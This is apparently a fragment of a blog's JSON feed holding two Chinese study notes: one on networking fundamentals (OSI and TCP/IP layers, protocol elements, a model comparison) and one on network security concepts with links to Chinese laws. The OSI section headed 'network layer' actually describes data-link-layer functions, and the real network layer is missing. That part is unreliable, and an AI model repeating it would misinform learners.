            "content_html": "<h1 id=\"网络基础\"><a class=\"anchor\" href=\"#网络基础\">#</a> 网络基础</h1>\n<h2 id=\"计算机通信网的组成\"><a class=\"anchor\" href=\"#计算机通信网的组成\">#</a> 计算机通信网的组成</h2>\n<p>计算机网络由通信子网和资源子网组成。其中通信子网负责数据的无差错和有序传递，其处理功能包括差错控制、流量控制、路由选择、网络互连等。其中资源子网是计算机通信的本地系统环境，包括主机、终端和应用程序等，资源子网的主要功能是用户资源配置、数据的处理和管理、软件和硬件共享以及负载均衡等。总的来说，计算机通信网就是一个由通信子网承载的、传输和共享资源子网的各类信息的系统。</p>\n<h2 id=\"通信协议\"><a class=\"anchor\" href=\"#通信协议\">#</a> 通信协议</h2>\n<p>为了完成计算机之间有序的信息交换，提出了通信协议的概念，其定义是相互通信的双方（或多方）对如何进行信息交换所必须遵守的一整套规则。</p>\n<p>协议涉及到三个要素，分别为：</p>\n<ul>\n<li>语法：语法是用户数据与控制信息的结构与格式，以及数据出现顺序的意义</li>\n<li>语义：用于解释比特流的每一部分的意义</li>\n<li>时序：事件实现顺序的详细说明</li>\n</ul>\n<h2 id=\"osi七层模型\"><a class=\"anchor\" href=\"#osi七层模型\">#</a> OSI 七层模型</h2>\n<h3 id=\"物理层\"><a class=\"anchor\" href=\"#物理层\">#</a> 物理层</h3>\n<ul>\n<li>提供建立、维护和释放物理链路所需的机械、电气功能和规程等特性</li>\n<li>通过传输介质进行数据流 (比特流) 的物理传输、故障监测和物理层管理</li>\n<li>从数据链路层接收帧，将比特流转换成底层物理介质上的信号</li>\n</ul>\n<h3 id=\"网络层\"><a class=\"anchor\" href=\"#网络层\">#</a> 网络层</h3>\n<ul>\n<li>在物理链路的两端之间传输数据</li>\n<li>在网络层实体间提供数据传输功能和控制</li>\n<li>提供数据的流量控制</li>\n<li>检测和纠正物理链路产生的差错</li>\n<li>格式化的消息称为帧</li>\n</ul>\n<h3 id=\"传输层\"><a class=\"anchor\" href=\"#传输层\">#</a> 传输层</h3>\n<ul>\n<li>提供无差错的数据传输</li>\n<li>接收来自会话层的数据，如果需要，将数据分割成更小的分组，向网络层传送分组并确保分组完整和正确到达它们的目的地</li>\n<li>在系统之间提供可靠的透明的数据传输，提供端到端的错误恢复和流量控制</li>\n</ul>\n<h3 id=\"会话层\"><a class=\"anchor\" href=\"#会话层\">#</a> 会话层</h3>\n<ul>\n<li>提供节点之间通信过程的协调</li>\n<li>负责执行会话规则（如：连接是否允许半双工或全双工通信）、同步数据流以及当故障发生时重新建立连接</li>\n<li>使用上面的表示层和下面的传输层的功能</li>\n</ul>\n<h3 id=\"表示层\"><a class=\"anchor\" href=\"#表示层\">#</a> 表示层</h3>\n<ul>\n<li>提供数据格式、变换和编码转换</li>\n<li>涉及正在传输数据的语法和语义</li>\n<li>将消息以合适电子传输的格式编码</li>\n<li>执行该层的数据压缩和加密</li>\n<li>从应用层接收消息，转换格式，并传送到会话层，该层常合并在应用层中</li>\n</ul>\n<h3 id=\"应用层\"><a class=\"anchor\" href=\"#应用层\">#</a> 应用层</h3>\n<p>包括各种协议，它们定义了具体的面向用户的应用：如电子邮件、文件传输等</p>\n<h3 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h3>\n<p>低三层模型属于通信子网，涉及为用户间提供透明连接，操作主要以每条链路（ hop-by-hop）为基础，在节点间的各条数据链路上进行通信。由网络层来控制各条链路上的通信，但要依赖于其他节点的协调操作。</p>\n<p>高三层属于资源子网，主要涉及保证信息以正确可理解形式传送。</p>\n<p>传输层是高三层和低三层之间的接口，它是第一个端到端的层次，保证透明的端到端连接，满足用户的服务质量（QoS）要求，并向高三层提供合适的信息形式。</p>\n<h2 id=\"tcpip四层模型\"><a class=\"anchor\" href=\"#tcpip四层模型\">#</a> TCP/IP 四层模型</h2>\n<h3 id=\"网络接口层\"><a class=\"anchor\" href=\"#网络接口层\">#</a> 网络接口层</h3>\n<p>网络接入层与 OSI 参考模型中的物理层和数据链路层相对应。它负责监视数据在主机和网络之间的交换。事实上，TCP/IP 本身并未定义该层的协议，而由参与互连的各网络使用自己的物理层和数据链路层协议，然后与 TCP/IP 的网络接入层进行连接。地址解析协议（ARP）工作在此层，即 OSI 参考模型的数据链路层。</p>\n<h3 id=\"网际层\"><a class=\"anchor\" href=\"#网际层\">#</a> 网际层</h3>\n<p>网际层对应于 OSI 参考模型的网络层，主要解决主机到主机的通信问题。它所包含的协议设计数据包在整个网络上的逻辑传输。注重重新赋予主机一个 IP 地址来完成对主机的寻址，它还负责数据包在多种网络中的路由。该层有三个主要协议：网际协议（IP）、互联网组管理协议（IGMP）和互联网控制报文协议（ICMP）。</p>\n<h3 id=\"运输层\"><a class=\"anchor\" href=\"#运输层\">#</a> 运输层</h3>\n<p>运输层对应于 OSI 参考模型的传输层，为应用层实体提供端到端的通信功能，保证了数据包的顺序传送及数据的完整性。该层定义了两个主要的协议：传输控制协议（TCP）和用户数据报协议（UDP)</p>\n<h3 id=\"应用层-2\"><a class=\"anchor\" href=\"#应用层-2\">#</a> 应用层</h3>\n<p>应用层对应于 OSI 参考模型的高层，为用户提供所需要的各种服务，例如：FTP、Telnet、DNS、SMTP 等</p>\n<h2 id=\"osi模型与tcpip模型对比\"><a class=\"anchor\" href=\"#osi模型与tcpip模型对比\">#</a> OSI 模型与 TCP/IP 模型对比</h2>\n<p><img data-src=\"https://s2.loli.net/2022/11/24/7PVpnCLrqtSUDOM.jpg\" alt=\"\" /></p>\n<p>共同点<br />\n（1）OSI 参考模型和 TCP/IP 参考模型都采用了层次结构的概念。<br />\n（2）都能够提供面向连接和无连接两种通信服务机制。<br />\n不同点<br />\n（1）OSI 采用的七层模型，而 TCP/IP 是四层结构。<br />\n（2）TCP/IP 参考模型的网络接口层实际上并没有真正的定义，只是一些概念性的描述。而 OSI 参考模型不仅分了两层，而且每一层的功能都很详尽，甚至在数据链路层又分出一个介质访问子层，专门解决局域网的共享介质问题。<br />\n（3）OSI 模型是在协议开发前设计的，具有通用性。TCP/IP 是先有协议集然后建立模型，不适用于非 TCP/IP 网络。<br />\n（4）OSI 参考模型与 TCP/IP 参考模型的传输层功能基本相似，都是负责为用户提供真正的端对端的通信服务，也对高层屏蔽了底层网络的实现细节。所不同的是 TCP/IP 参考模型的传输层是建立在网络互联层基础之上的，而网络互联层只提供无连接的网络服务，所以面向连接的功能完全在 TCP 协议中实现，当然 TCP/IP 的传输层还提供无连接的服务，如 UDP；相反 OSI 参考模型的传输层是建立在网络层基础之上的，网络层既提供面向连接的服务，又提供无连接的服务，但传输层只提供面向连接的服务。<br />\n（5）OSI 参考模型的抽象能力高，适合与描述各种网络；而 TCP/IP 是先有了协议，才制定 TCP/IP 模型的。<br />\n（6）OSI 参考模型的概念划分清晰，但过于复杂；而 TCP/IP 参考模型在服务、接口和协议的 区别上不清楚，功能描述和实现细节混在一起。<br />\n（7）TCP/IP 参考模型的网络接口层并不是真正的一层；OSI 参考模型的缺点是层次过多，划分意义不大但增加了复杂性。</p>\n",
            "tags": [
                "计算机网络",
                "网络协议"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/netwsecu/",
            "url": "https://mobius-0.github.io/security/WebNote/netwsecu/",
            "title": "网络安全观",
            "date_published": "2022-11-24T02:25:18.000Z",
            "content_html": "<h1 id=\"网络安全定义\"><a class=\"anchor\" href=\"#网络安全定义\">#</a> 网络安全定义</h1>\n<p>网络安全的一个通用定义指网络信息系统的硬件、软件及其系统中的数据受到保护，不因偶然的或者恶意的破坏、更改、泄露，系统能连续、可靠、正常地运行，服务不中断。网络安全简单的说是在网络环境下能够识别和消除不安全因素的能力。</p>\n<p>网络安全在不同环境和应用中有不同的解释，例如系统运行的安全、系统信息内容的安全、信息通信与传播的安全等。</p>\n<p>网络安全的基本需求包括可靠性、可用性、保密性、完整性、不可抵赖性、可控性、可审查性、真实性等。其中三个最基本的要素是机密性 (Confidentiality)、完整性 (Integrity)、可用性 (Availability)。</p>\n<p>机密性是不将有用信息泄漏给非授权用户的特性。可以通过信息加密、身份认证、访问控制、安全通信协议等技术实现，信息加密是防止信息非法泄露的最基本手段，主要强调有用信息只被授权对象使用的特征。</p>\n<p>完整性是指信息在传输、交换、存储和处理过程中，保持信息不被破坏或修改、不丢失和信息未经授权不能改变的特性，也是最基本的安全特征。</p>\n<p>可用性指信息资源可被授权实体按要求访问、正常使用或在非正常情况下能恢复使用的特性。在系统运行时正确存取所需信息，当系统遭受意外攻击或破坏时，可以迅速恢复并能投入使用。是衡量网络信息系统面向用户的一种安全性能，以保障为用户提供服务。</p>\n<p>网络安全的主体是保护网络上的数据和通信的安全，数据安全性是指软硬件保护措施，用来阻止对数据进行非授权的泄漏、转移、修改和破坏等，通信安全性是通信保护措施，要求在通信中采用保密安全性、传输安全性、辐射安全性等措施。</p>\n<h1 id=\"相关法律法规\"><a class=\"anchor\" href=\"#相关法律法规\">#</a> 相关法律法规</h1>\n<ul>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5ucGMuZ292LmNuL25wYy9jMzA4MzQvMjAxNjExLzI3MGI0M2U4YjM1ZTRmN2VhOTg1MDJiNmYwZTI2ZjhhLnNodG1s\">中华人民共和国网络安全法</span></p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5nb3YuY24vemhlbmdjZS96aGVuZ2Nla3UvMjAyMS0wNy8xNC9jb250ZW50XzU2MjQ5NjUuaHRt\">网络产品安全漏洞管理规定</span></p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5nb3YuY24vemhlbmdjZS9jb250ZW50LzIwMjEtMDgvMTcvY29udGVudF81NjMxNjcxLmh0bQ==\">关键信息基础设施安全保护条例</span></p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5ucGMuZ292LmNuL25wYy9jMzA4MzQvMjAyMTA4L2E4YzRlMzY3MmM3NDQ5MWE4MGI1M2ExNzJiYjc1M2ZlLnNodG1s\">中华人民共和国个人信息保护法</span></p>\n</li>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5ucGMuZ292LmNuL25wYy9jMzA4MzQvMjAyMTA2LzdjOWFmMTJmNTEzMzRhNzNiNTZkNzkzOGY5OWE3ODhhLnNodG1s\">中华人民共和国数据安全法</span></p>\n</li>\n</ul>\n",
            "tags": [
                "网络安全",
                "法律法规"
            ]
        }
    ]
}